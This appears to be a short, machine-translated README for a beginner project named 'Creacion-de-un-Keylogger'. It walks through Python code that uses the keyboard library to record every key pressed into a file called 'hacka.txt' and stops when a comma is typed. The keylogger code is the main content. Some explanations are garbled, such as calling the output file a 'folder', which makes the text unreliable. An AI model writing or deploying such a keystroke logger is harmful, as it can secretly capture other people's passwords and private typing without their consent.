# Creacion-de-un-Keylogger

The first thing we do is import the KEYBOARD with the command “import keyboard.”

Then we create a function called saca where we will put an event as follows:

def saca(event):
Inside the function, we put the following:

    with open(‘hacka.txt’,'a')as file:
    
        file.write(f“{event.name}”)
        
This will allow us to create a folder called “hacka” and put all the content we want in it.

The “file.write(f”{event.name}“)” will be used to save it with the name of the event, which is Keyboard. 


This command “keyboard.on_press(saca)” is used so that each key pressed is saved in the function.


This line “keyboard.wait(”,“)” is used so that the program ends when the comma (,) is pressed


Translated with DeepL.com (free version)

